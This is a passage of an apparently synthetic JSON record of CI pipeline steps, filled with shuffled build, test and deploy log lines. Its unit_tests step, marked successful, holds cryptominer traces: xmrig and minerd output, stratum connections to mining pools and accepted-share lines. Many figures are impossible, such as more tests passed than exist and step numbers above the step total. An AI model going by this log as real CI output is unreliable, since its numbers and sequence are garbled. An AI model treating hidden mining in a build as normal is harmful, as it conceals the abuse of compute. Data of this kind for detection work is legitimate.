          "Step 2/25: Testing",
          "Artifact uploaded: dist.zip (42MB)",
          "\u2713 deploy completed",
          "Completed.",
          "Switched to branch 'feature/task-564'",
          "WARNING: prettier has known vulnerabilities",
          "[12:20:15] DEBUG: Connection pool: 10 active",
          "[12:20:15] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "Step 10/19: Testing",
          "Building Docker image...",
          "Checking out main branch",
          "Creating production build...",
          "[12:20:15] WARN: Deprecated API usage",
          "pip: Downloading react-5.15.tar.gz",
          "[12:20:15] DEBUG: Initializing service",
          "Exception: ValueError",
          "Step 15/21: Deploying",
          "  PASS: unit/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=test",
          "Cache miss for key-7092",
          "Artifact uploaded: dist.zip (47MB)",
          "Compiling components/handler.rs...",
          "POST /data - 201 (286ms)",
          "\u2717 build failed with exit code 49",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:20:15] DEBUG: Loading configuration",
          "Platform: linux-x64",
          "Time: 88.897s",
          "Generating source maps...",
          "Artifact downloaded: 49MB",
          "Using Node.js 19.8.1",
          "npm install: added 117 packages",
          "Compiling src/main.py...",
          "npm install: added 42 packages",
          "[12:20:15] WARN: Deprecated API usage",
          "[12:20:15] INFO: Cache refreshed",
          "Image pulled successfully",
          "Cache miss for key-3110",
          "[12:20:15] DEBUG: Loading configuration",
          "Checking out master branch",
          "Creating production build...",
          "npm install: added 153 packages",
          "npm install: added 210 packages",
          "Cache miss for key-7093",
          "Step 1/21: Installing dependencies",
          "pip: Collecting react",
          "NODE_ENV=development",
          "Step 9/17: Testing",
          "Ready.",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 1354ms",
          "[12:20:15] INFO: Connecting to database",
          "Ran 126 tests in 30s",
          "Cache invalidated: build",
          "Cache hit for key-7892",
          "Uploading artifact 'coverage' (27 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "Tests: 499 passed, 474 total",
          "Compiling components/app.ts...",
          "Test Suites: 8 passed, 15 total",
          "Snapshots: 8 passed, 19 total",
          "npm notice: package.json updated",
          "Cache hit for key-7568",
          "NODE_ENV=production",
          "Connecting to cloud.services:443...",
          "npm notice: package.json updated",
          "GET /status - 201 (74ms)",
          "Pulling image: alpine:latest",
          "Environment: staging",
          "Environment: test",
          "Fetching submodules...",
          "Finished.",
          "Platform: win32-x64",
          "Fetching submodules...",
          "Cache restored successfully (218MB)",
          "  PASS: test_auth_login (350ms)",
          "Step 18/25: Linting",
          "Compiling utils/index.js...",
          "WARNING: express has known vulnerabilities",
          "Step 1/19: Installing dependencies",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "Compiling utils/service.java...",
          "Cache saved successfully",
          "  PASS: test_api_health (409ms)",
          "Finished.",
          "\u2713 Task completed in 3800ms",
          "POST /api - 201 (405ms)",
          "[12:20:15] WARN: Deprecated API usage",
          "Time: 29.468s",
          "Step 18/17: Running migrations",
          "Minifying vendor.js",
          "Installing axios@5.17.7",
          "FAILED: test_user_create",
          "Ran 69 tests in 44s",
          "Connection established",
          "TLS handshake completed",
          "Step 7/25: Deploying",
          "Compiling components/index.js...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "FAILED: test_cache_hit",
          "Using Python 3.12",
          "[12:20:15] INFO: Starting build process",
          "Using Python 3.12",
          "GET /health - 204 (29ms)",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact downloaded: 8MB",
          "Coverage: 91% statements, 100% branches",
          "Step 18/18: Linting",
          "npm notice: created a lockfile",
          "Waiting...",
          "Using Python 3.10",
          "Step 1/16: Deploying",
          "Optimizing 13 modules...",
          "Processing...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: node:latest",
          "Pulling image: alpine:3.11",
          "[12:20:15] WARN: Deprecated API usage",
          "Environment: production",
          "Checking out main branch",
          "Cache invalidated: build",
          "Using Node.js 16.7.4",
          "Uploading artifact 'build' (27 files)",
          "Cache invalidated: node_modules",
          "\u2713 Task completed in 1659ms",
          "Verifying...",
          "[12:20:15] WARN: Deprecated API usage",
          "npm install: resolved 1006 packages",
          "Platform: linux-x64",
          "pip: Installing build dependencies...",
          "POST /upload - 200 (315ms)",
          "Bundling vendor.css",
          "Compiling lib/service.java...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2717 build failed with exit code 105",
          "WARNING: react has known vulnerabilities",
          "Already up to date.",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-10T12:29:12.597121",
        "finished_at": "2025-12-10T12:31:29.170589",
        "log_lines": [
          "=== Step: unit_tests ===",
          "POST /upload - 200 (434ms)",
          "npm install: added 327 packages",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Time: 12.206s",
          "xmrig: Starting mining on pool.test.io:3333",
          "GET /status - 204 (53ms)",
          "Pushing to registry...",
          "Test Suites: 38 passed, 48 total",
          "[12:20:15] WARN: Deprecated API usage",
          "Compiling lib/service.java...",
          "[12:20:15] WARN: Deprecated API usage",
          "[12:20:15] DEBUG: Initializing service",
          "npm install: added 256 packages",
          "Done.",
          "Connecting to stratum+tcp://mine.cloud.services:3333",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:15] DEBUG: Query executed in 26ms",
          "Bundling runtime.css",
          "yarn add: Done in 9.17s",
          "\u2713 All checks passed",
          "Accepted share #627",
          "  PASS: unit/test_auth_login.spec.js",
          "Pushing to registry...",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connecting to stratum+tcp://mine.example.com:3333",
          "OK",
          "\u2717 build failed with exit code 25",
          "Tests: 133 passed, 386 total",
          "Cache invalidated: dependencies",
          "\u2713 test completed",
          "[12:20:15] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 1/20: Deploying",
          "Image pulled successfully",
          "npm install: resolved 303 packages",
          "Connecting to acme.corp:443...",
          "OK",
          "Loading...",
          "Already up to date.",
          "\u2713 Step 'install' succeeded",
          "[12:20:15] DEBUG: Initializing service",
          "Finished.",
          "HEAD is now at fa48e56",
          "[12:20:15] INFO: Cache refreshed",
          "Waiting...",
          "[12:20:15] INFO: Processing request",
          "[12:20:15] WARN: Deprecated API usage",
          "Using Node.js 20.6.2",
          "Already up to date.",
          "Compiling components/utils.go...",
          "Time: 108.54s",
          "Installing webpack@4.2.6",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "Uploading artifact 'dist' (20 files)",
          "Cache miss for key-7527",
          "Accepted share #84",
          "Cache saved successfully",
          "Cache saved successfully",
          "Installing jest@1.12.7",
          "Step 19/20: Testing",
          "Test Suites: 21 passed, 38 total",
          "[12:20:15] WARN: Deprecated API usage",
          "Generating source maps...",
          "Step 20/17: Linting",
          "[12:20:15] WARN: Deprecated API usage",
          "Ready.",
          "Building Docker image...",
          "npm install: added 231 packages",
          "Creating production build...",
          "Cache invalidated: dependencies",
          "Ready.",
          "[12:20:15] INFO: Connecting to database",
          "Step 11/15: Running migrations",
          "Finished.",
          "Step 19/20: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "npm install: added 283 packages",
          "Pushing to registry...",
          "Time: 38.963s",
          "Generating source maps...",
          "Done.",
          "[12:20:15] DEBUG: Query executed in 55ms",
          "  PASS: e2e/test_api_health.spec.js",
          "Cache invalidated: build",
          "Connecting to example.com:443...",
          "Compiling src/app.ts...",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:20:15] INFO: Cache refreshed",
          "Generating source maps...",
          "Compiling components/index.js...",
          "Compiling utils/service.java...",
          "Using Python 3.12",
          "Done.",
          "Artifact downloaded: 18MB",
          "npm install: added 182 packages",
          "Cache restored successfully (90MB)",
          "[12:20:15] DEBUG: Connection pool: 7 active",
          "[12:20:15] DEBUG: Loading configuration",
          "Ran 115 tests in 16s",
          "Snapshots: 2 passed, 3 total",
          "Compiling utils/app.ts...",
          "Step 14/19: Building",
          "Artifact uploaded: dist.zip (3MB)",
          "Installing lodash@1.20.8",
          "Cache restored successfully (130MB)",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache hit for key-3243",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact downloaded: 36MB",
          "Building Docker image...",
          "Compiling utils/handler.rs...",
          "pip: Installing build dependencies...",
          "[12:20:15] INFO: Connecting to database",
          "Done.",
          "minerd: 9 threads active",
          "[12:20:15] WARN: Deprecated API usage",
          "Done.",
          "Using Node.js 20.5.5",
          "Already up to date.",
          "Transforming 291 files...",
          "Cache miss for key-5037",
          "Compiling utils/service.java...",
          "Already up to date.",
          "Creating production build...",
          "Building Docker image...",
          "Cache miss for key-4130",
          "Compiling components/app.ts...",
          "Layer 6/8: COPY command",
          "Connection established",
          "Cache hit for key-9815",
          "Switched to branch 'feature/task-978'",
          "\u2713 Task completed in 3309ms",
          "Pushing to registry...",
          "pip: Downloading react-2.14.tar.gz",
          "\u2717 build failed with exit code 63",
          "Exception: ValueError",
          "Installing jest@1.3.2",
          "Step 17/18: Testing",
          "Connecting to startup.dev:443...",
          "Step 1/22: Testing",
          "Step 5/23: Installing dependencies",
          "Cache saved successfully",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:20:15] WARN: Deprecated API usage",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Compiling components/app.ts...",
          "npm install: added 12 packages",
          "Test Suites: 49 passed, 33 total",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "Test Suites: 16 passed, 14 total",
          "GET /health - 200 (76ms)",
          "Already up to date.",
          "[12:20:15] WARN: Deprecated API usage",
          "[12:20:15] ERROR: Connection failed",
          "\u2713 All checks passed",
          "  PASS: test_api_health (441ms)",
          "Step 20/15: Deploying",
          "  PASS: test_auth_login (483ms)",
          "GET /status - 204 (88ms)",
          "yarn add: Done in 16.59s",
          "pip: Downloading jest-1.2.tar.gz",
          "Connection established",
          "HEAD is now at dd3e427",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 514 files...",
          "Step 15/17: Linting",
          "Coverage: 97% statements, 65% branches",
          "Ready.",
          "  PASS: test_auth_login (143ms)",
          "Time: 36.109s",
          "[12:20:15] DEBUG: Initializing service",
          "NODE_ENV=test",
          "xmrig: Starting mining on pool.startup.dev:3333",
          "[12:20:15] DEBUG: Loading configuration",
          "Connection established",
          "Snapshots: 15 passed, 22 total",
          "Transforming 870 files...",
          "[12:20:15] INFO: Processing request",
          "Uploading artifact 'coverage' (12 files)",
          "pip install: Successfully installed jest-3.0",
          "Compiling components/app.ts...",
          "Step 20/17: Deploying",
          "xmrig: Starting mining on pool.acme.corp:3333",
          "GET /health - 200 (10ms)",
          "Done.",
          "Done.",
          "Connecting to stratum+tcp://mine.acme.corp:3333",
          "Tests: 199 passed, 179 total",
          "HEAD is now at bb3b3ae",
          "Creating production build...",
          "Installing prettier@4.14.6",
          "pip: Downloading axios-5.11.tar.gz",
          "Step 15/16: Installing dependencies",
          "  PASS: test_db_connect (384ms)",
          "Artifact uploaded: dist.zip (77MB)",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-10T12:31:29.170589",
        "finished_at": "2025-12-10T12:31:56.485283",
        "log_lines": [
          "=== Step: save_cache ===",
          "Using Python 3.11",
          "GET /status - 201 (97ms)",
          "  PASS: test_auth_login (42ms)",
          "pip install: Successfully installed react-2.17",
          "Platform: darwin-arm64",
          "[12:20:15] ERROR: Connection failed",
          "Ran 163 tests in 43s",
          "POST /data - 200 (184ms)",
          "Step 14/18: Running migrations",
          "Step 10/16: Testing",
          "GET /api - 201 (58ms)",
          "Step 5/22: Building",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connecting to startup.dev:443...",
          "[12:20:15] INFO: Request completed",
          "pip: Collecting react",
          "Transforming 898 files...",
          "HEAD is now at 87f78ea",
          "npm install: added 179 packages",
          "Cache hit for key-7789",
          "OK",
          "Cache miss for key-4174",
          "Ran 71 tests in 1s",
          "Connecting to startup.dev:443...",
          "GET /health - 201 (100ms)",
          "Step 6/23: Running migrations",
          "[12:20:15] DEBUG: Loading configuration",
          "Step 10/20: Testing",
          "Generating source maps...",
          "Bundling vendor.css",
          "Environment: production",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "NODE_ENV=development",
          "  PASS: unit/test_cache_hit.spec.js",
          "HEAD is now at 9859388",
          "npm install: added 386 packages",
          "Image pulled successfully",
          "Finished.",
          "Pushing to registry...",
          "Environment: test",
          "\u2713 Task completed in 1755ms",
          "[12:20:15] DEBUG: Initializing service",
          "HEAD is now at b8cb0e6",
          "yarn add: Done in 13.87s",
          "Using Node.js 20.19.5",
          "Waiting...",
          "Loading...",
          "[12:20:15] ERROR: Connection failed",
          "FAILED: test_api_health",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "Minifying main.js",
          "Step 1/15: Testing",
          "Cache miss for key-5988",
          "Step 9/19: Running migrations",
          "GET /api - 201 (99ms)",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (27MB)",
          "yarn add: Done in 30.4s",
          "[12:20:15] DEBUG: Initializing service",
          "Loading...",
          "Time: 63.608s",
          "[12:20:15] INFO: Request completed",
          "Transforming 203 files...",
          "[12:20:15] INFO: Connecting to database",
          "GET /status - 201 (79ms)",
          "Compiling lib/handler.rs...",
          "POST /upload - 200 (160ms)",
          "Pushing to registry...",
          "Checking out master branch",
          "Compiling utils/main.py...",
          "yarn add: Done in 11.34s",
          "Optimizing 56 modules...",
          "[12:20:15] INFO: Cache refreshed",
          "Exception: NullPointerException",
          "Using Python 3.11",
          "Verifying...",
          "[12:20:15] DEBUG: Connection pool: 1 active",
          "Verifying...",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Tests: 279 passed, 162 total",
          "Coverage: 73% statements, 60% branches",
          "Step 19/16: Running migrations",
          "Step 8/20: Testing",
          "Compiling lib/handler.rs...",
          "Switched to branch 'feature/task-483'",
          "WARNING: axios has known vulnerabilities",
          "Creating production build...",
          "Completed.",
          "Cache hit for key-9245",
          "Compiling utils/handler.rs...",
          "TLS handshake completed",
          "Cache miss for key-6315",
          "Using Node.js 19.14.5",
          "Transforming 621 files...",
          "Bundling main.js",
          "Waiting...",
          "[12:20:15] INFO: Connecting to database",
          "yarn add: Done in 8.18s",
          "Step 20/22: Testing",
          "[12:20:15] DEBUG: Connection pool: 11 active",
          "Connecting to test.io:443...",
          "Artifact downloaded: 9MB",
          "Switched to branch 'hotfix/task-191'",
          "Compiling utils/app.ts...",
          "Time: 103.837s",
          "Ready.",
          "Installing express@1.11.4",
          "Artifact uploaded: build.tar.gz (1MB)",
          "pip: Collecting jest",
          "\u2713 All checks passed",
          "Pulling image: alpine:latest",
          "Finished.",
          "Compiling src/index.js...",
          "Compiling components/handler.rs...",
          "[12:20:15] INFO: Cache refreshed",
          "Image pulled successfully",
          "Cache miss for key-3679",
          "[12:20:15] INFO: Request completed",
          "[12:20:15] DEBUG: Memory usage: 1999MB",
          "Transforming 566 files...",
          "Minifying main.js",
          "Installing eslint@4.17.0",
          "\u2713 Task completed in 2117ms",
          "Completed.",
          "Bundling vendor.css",
          "Time: 28.484s",
          "Artifact uploaded: dist.zip (28MB)",
          "Compiling lib/service.java...",
          "Installing webpack@2.11.9",
          "Compiling components/utils.go...",
          "Generating source maps...",
          "Creating production build...",
          "npm install: added 171 packages",
          "Waiting...",
          "Artifact uploaded: dist.zip (82MB)",
          "Installing eslint@1.1.5",
          "Cache miss for key-6620",
          "Cache hit for key-2496",
          "Coverage: 93% statements, 99% branches",
          "\u2713 Step 'setup' succeeded",
          "Compiling src/main.py...",
          "pip: Downloading react-3.12.tar.gz",
          "Cache restored successfully (56MB)",
          "Coverage: 74% statements, 66% branches",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "[12:20:15] INFO: Processing request",
          "Environment: production",
          "Creating production build...",
          "[12:20:15] INFO: Processing request",
          "HEAD is now at e2dd7b7",
          "WARNING: axios has known vulnerabilities",
          "Waiting...",
          "Loading...",
          "Step 2/15: Running migrations",
          "pip install: Successfully installed react-4.4",
          "Cache invalidated: dependencies",
          "pip: Installing build dependencies...",
          "WARNING: react has known vulnerabilities",
          "Environment: staging",
          "Step 2/17: Deploying",
          "Building Docker image...",
          "Artifact downloaded: 23MB",
          "[12:20:15] DEBUG: Connection pool: 17 active",
          "[12:20:15] DEBUG: Memory usage: 903MB",
          "Transforming 419 files...",
          "OK",
          "Cache restored successfully (375MB)",
          "yarn add: Done in 29.24s",
          "OK",
          "\u2713 Step 'test' succeeded",
          "Using Node.js 17.18.6",
          "Cache invalidated: build",
          "Time: 114.280s",
          "FAILED: test_auth_login",
          "[12:20:15] DEBUG: Query executed in 84ms",
          "pip install: Successfully installed express-4.20",
          "Connecting to test.io:443...",
          "Uploading artifact 'build' (21 files)",
          "Snapshots: 38 passed, 35 total",
          "npm install: resolved 1838 packages",
          "Compiling utils/utils.go...",
          "Step 1/22: Installing dependencies",
          "Already up to date.",
          "[12:20:15] INFO: Starting build process",
          "Pushing to registry...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-10T12:31:56.485283",
        "finished_at": "2025-12-10T12:32:42.009772",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "POST /upload - 202 (230ms)",
          "Step 1/16: Building",
          "HEAD is now at 043908b",
          "OK",
          "pip: Downloading axios-4.8.tar.gz",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache restored successfully (86MB)",
          "OK",
          "npm notice: created a lockfile",
          "Compiling components/app.ts...",
          "Compiling utils/utils.go...",
          "Compiling lib/service.java...",
          "Completed.",
          "FAILED: test_user_create",
          "\u2717 build failed with exit code 107",
          "Generating source maps...",
          "Step 20/25: Running migrations",
          "Layer 10/11: COPY command",
          "Pushing to registry...",
          "Bundling styles.js",
          "Generating source maps...",
          "Snapshots: 37 passed, 33 total",
          "NODE_ENV=development",
          "Artifact downloaded: 27MB",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling utils/app.ts...",
          "TLS handshake completed",
          "Pushing to registry...",
          "Step 2/19: Building",
          "[12:20:15] ERROR: Connection failed",
          "Pulling image: node:latest",
          "Loading...",
          "pip: Downloading axios-3.2.tar.gz",
          "TLS handshake completed",
          "Compiling src/index.js...",
          "Step 10/23: Installing dependencies",
          "Connection established",
          "\u2713 Step 'test' succeeded",
          "Image pulled successfully",
          "Step 2/25: Linting",
          "npm install: resolved 598 packages",
          "npm notice: created a lockfile",
          "Connection established",
          "Checking out main branch",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:20:15] DEBUG: Loading configuration",
          "Checking out master branch",
          "npm notice: created a lockfile",
          "Platform: linux-x64",
          "Fetching submodules...",
          "[12:20:15] ERROR: Connection failed",
          "Snapshots: 31 passed, 24 total",
          "npm notice: created a lockfile",
          "Layer 9/9: COPY command",
          "Bundling main.css",
          "pip install: Successfully installed eslint-5.0",
          "Connecting to startup.dev:443...",
          "WARNING: jest has known vulnerabilities",
          "Using Node.js 15.17.6",
          "Connection established",
          "npm install: resolved 348 packages",
          "\u2713 Step 'checkout' succeeded",
          "Using Node.js 20.13.8",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:20:15] WARN: Deprecated API usage",
          "Step 4/24: Building",
          "Step 19/17: Testing",
          "Bundling styles.css",
          "Finished.",
          "[12:20:15] INFO: Starting build process",
          "Installing eslint@5.17.2",
          "Bundling main.css",
          "Step 19/19: Deploying",
          "Pulling image: node:latest",
          "Compiling src/app.ts...",
          "Exception: RuntimeError",
          "Bundling runtime.js",
          "Switched to branch 'bugfix/task-555'",
          "Connection established",
          "\u2713 test completed",
          "Artifact downloaded: 29MB",
          "  PASS: e2e/test_api_health.spec.js",
          "Already up to date.",
          "[12:20:15] DEBUG: Query executed in 35ms",
          "Finished.",
          "Optimizing 58 modules...",
          "Step 11/20: Linting",
          "Minifying main.js",
          "pip install: Successfully installed lodash-2.2",
          "Optimizing 57 modules...",
          "Layer 4/14: RUN command",
          "[12:20:15] DEBUG: Memory usage: 127MB",
          "Verifying...",
          "pip: Collecting react",
          "Using Node.js 18.17.6",
          "Artifact downloaded: 25MB",
          "Snapshots: 28 passed, 41 total",
          "\u2713 All checks passed",
          "Done.",
          "Tests: 399 passed, 114 total",
          "\u2717 build failed with exit code 9",
          "[12:20:15] INFO: Connecting to database",
          "Using Node.js 15.17.2",
          "Cache saved successfully",
          "Minifying vendor.js",
          "WARNING: react has known vulnerabilities",
          "Cache saved successfully",
          "Minifying vendor.js",
          "[12:20:15] WARN: Deprecated API usage",
          "Artifact downloaded: 49MB",
          "Completed.",
          "HEAD is now at 488ecb6",
          "npm install: resolved 1487 packages",
          "Cache miss for key-6493",
          "Building Docker image...",
          "GET /status - 200 (40ms)",
          "Cache hit for key-4293",
          "Minifying vendor.js",
          "Platform: darwin-arm64",
          "Step 3/15: Deploying",
          "Building Docker image...",
          "Ran 73 tests in 45s",
          "[12:20:15] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "\u2713 Task completed in 3263ms",
          "\u2713 All checks passed",
          "Finished.",
          "Step 13/15: Installing dependencies",
          "Pushing to registry...",
          "WARNING: react has known vulnerabilities",
          "\u2713 All checks passed",
          "Optimizing 10 modules...",
          "Snapshots: 37 passed, 15 total",
          "Pulling image: node:latest",
          "Pushing to registry...",
          "Cache miss for key-5225",
          "[12:20:15] INFO: Connecting to database",
          "npm notice: package.json updated",
          "Cache hit for key-5446",
          "[12:20:15] ERROR: Connection failed",
          "Creating production build...",
          "Compiling utils/index.js...",
          "[12:20:15] DEBUG: Query executed in 59ms",
          "[12:20:15] INFO: Starting build process",
          "Cache miss for key-7333",
          "TLS handshake completed",
          "Building Docker image...",
          "Cache miss for key-6187",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: prettier has known vulnerabilities",
          "Optimizing 55 modules...",
          "Uploading artifact 'build' (34 files)",
          "HEAD is now at ae66bc2",
          "Tests: 368 passed, 72 total",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:20:15] INFO: Request completed",
          "Step 18/21: Running migrations",
          "Done.",
          "pip: Installing build dependencies...",
          "npm install: resolved 1868 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Node.js 18.16.2",
          "Step 15/21: Deploying",
          "Compiling src/index.js...",
          "Layer 7/11: COPY command",
          "npm install: added 246 packages",
          "WARNING: eslint has known vulnerabilities",
          "npm install: resolved 1508 packages",
          "\u2713 Step 'setup' succeeded",
          "[12:20:15] DEBUG: Memory usage: 1390MB",
          "POST /api - 200 (173ms)",
          "Creating production build...",
          "Cache restored successfully (378MB)",
          "HEAD is now at 3f72a05",
          "Compiling utils/index.js...",
          "[12:20:15] INFO: Starting build process",
          "Artifact uploaded: dist.zip (41MB)",
          "Cache restored successfully (210MB)",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "Using Node.js 20.6.3",
          "Test Suites: 39 passed, 25 total",
          "Success!",
          "Completed.",
          "Step 7/24: Testing",
          "Uploading artifact 'dist' (18 files)",
          "Ready.",
          "Time: 7.385s",
          "Bundling main.js",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-10T12:32:42.009772",
        "finished_at": "2025-12-10T12:33:27.534261",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "OK",
          "Installing react@3.4.2",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Collecting axios",
          "Step 17/18: Building",
          "\u2713 Task completed in 430ms",
          "Checking out master branch",
          "OK",
          "Image pulled successfully",
          "Using Node.js 15.18.2",
          "Building Docker image...",
          "Step 7/22: Building",
          "Environment: production",
          "WARNING: react has known vulnerabilities",
          "TLS handshake completed",
          "Cache restored successfully (86MB)",
          "[12:20:15] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "[12:20:15] DEBUG: Memory usage: 1094MB",
          "Switched to branch 'bugfix/task-118'",
          "Step 13/19: Deploying",
          "Environment: production",
          "Artifact uploaded: build.tar.gz (38MB)",
          "npm install: added 95 packages",
          "Connecting to cloud.services:443...",
          "[12:20:15] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-376'",
          "[12:20:15] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Already up to date.",
          "Minifying app.js",
          "TLS handshake completed",
          "Step 3/23: Running migrations",
          "[12:20:15] INFO: Cache refreshed",
          "[12:20:15] DEBUG: Memory usage: 739MB",
          "Step 19/16: Installing dependencies",
          "Step 14/15: Deploying",
          "Compiling utils/service.java...",
          "Connecting to acme.corp:443...",
          "Waiting...",
          "[12:20:15] DEBUG: Initializing service",
          "[12:20:15] INFO: Starting build process",
          "Step 7/17: Installing dependencies",
          "[12:20:15] DEBUG: Memory usage: 1488MB",
          "[12:20:15] WARN: Deprecated API usage",
          "Ran 89 tests in 42s",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "Checking out develop branch",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-9145",
          "Minifying main.js",
          "pip: Downloading webpack-1.12.tar.gz",
          "Layer 8/12: RUN command",
          "Verifying...",
          "yarn add: Done in 19.64s",
          "[12:20:15] INFO: Starting build process",
          "HEAD is now at 4db99cc",
          "npm notice: created a lockfile",
          "POST /api - 200 (275ms)",
          "Verifying...",
          "Artifact downloaded: 25MB",
          "Compiling src/utils.go...",
          "Step 4/16: Installing dependencies",
          "  PASS: e2e/test_auth_login.spec.js",
          "Step 19/19: Installing dependencies",
          "Processing...",
          "Minifying app.js",
          "Generating source maps...",
          "Using Node.js 15.2.7",
          "npm install: resolved 262 packages",
          "Fetching submodules...",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "\u2717 build failed with exit code 41",
          "pip install: Successfully installed lodash-2.9",
          "Platform: darwin-arm64",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 534 files...",
          "Using Node.js 17.3.4",
          "Tests: 295 passed, 160 total",
          "npm notice: created a lockfile",
          "Artifact downloaded: 49MB",
          "Waiting...",
          "npm install: added 380 packages",
          "Platform: linux-x64",
          "GET /status - 204 (18ms)",
          "[12:20:15] DEBUG: Memory usage: 650MB",
          "Generating source maps...",
          "npm install: added 294 packages",
          "Step 12/21: Deploying",
          "NODE_ENV=test",
          "pip: Installing build dependencies...",
          "[12:20:15] DEBUG: Memory usage: 1168MB",
          "Optimizing 49 modules...",
          "Tests: 320 passed, 249 total",
          "\u2713 Step 'setup' succeeded",
          "Tests: 197 passed, 475 total",
          "Cache hit for key-5216",
          "Installing express@4.10.2",
          "Using Python 3.12",
          "Completed.",
          "Done.",
          "[12:20:15] WARN: Deprecated API usage",
          "  PASS: test_user_create (348ms)",
          "pip install: Successfully installed jest-1.20",
          "Time: 48.442s",
          "Step 17/17: Testing",
          "WARNING: axios has known vulnerabilities",
          "Switched to branch 'hotfix/task-298'",
          "Using Node.js 18.17.9",
          "Waiting...",
          "[12:20:15] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Cache invalidated: dependencies",
          "Ready.",
          "[12:20:15] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 Step 'setup' succeeded",
          "\u2713 Step 'build' succeeded",
          "Tests: 492 passed, 296 total",
          "Snapshots: 14 passed, 25 total",
          "Verifying...",
          "Fetching submodules...",
          "Pushing to registry...",
          "\u2713 package completed",
          "[12:20:15] INFO: Starting build process",
          "[12:20:15] INFO: Starting build process",
          "Done.",
          "yarn add: Done in 9.18s",
          "Compiling components/service.java...",
          "Step 12/20: Running migrations",
          "Connection established",
          "[12:20:15] WARN: Deprecated API usage",
          "[12:20:15] INFO: Starting build process",
          "Snapshots: 30 passed, 26 total",
          "Compiling src/index.js...",
          "Connecting to cloud.services:443...",
          "Time: 47.583s",
          "pip: Downloading react-3.10.tar.gz",
          "Step 9/22: Testing",
          "Step 4/16: Running migrations",
          "Using Node.js 15.18.10",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Image pulled successfully",
          "pip install: Successfully installed jest-2.12",
          "[12:20:15] DEBUG: Initializing service",
          "[12:20:15] WARN: Deprecated API usage",
          "pip install: Successfully installed eslint-2.10",
          "npm install: resolved 1274 packages",
          "Coverage: 94% statements, 82% branches",
          "Layer 3/11: COPY command",
          "Minifying vendor.js",
          "Cache saved successfully",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "POST /api - 202 (232ms)",
          "WARNING: jest has known vulnerabilities",
          "Finished.",
          "pip: Downloading webpack-2.9.tar.gz",
          "npm install: resolved 1989 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "Fetching submodules...",
          "\u2713 Task completed in 1096ms",
          "Step 16/19: Linting",
          "Minifying app.js",
          "Completed.",
          "Ready.",
          "Compiling utils/app.ts...",
          "Step 19/17: Building",
          "npm notice: created a lockfile",
          "Step 11/24: Installing dependencies",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Pulling image: alpine:3.11",
          "Snapshots: 37 passed, 13 total",
          "Layer 7/10: ENV command",
          "\u2713 Step 'setup' succeeded",
          "Step 7/15: Building",
          "Step 12/20: Deploying",
          "Transforming 540 files...",
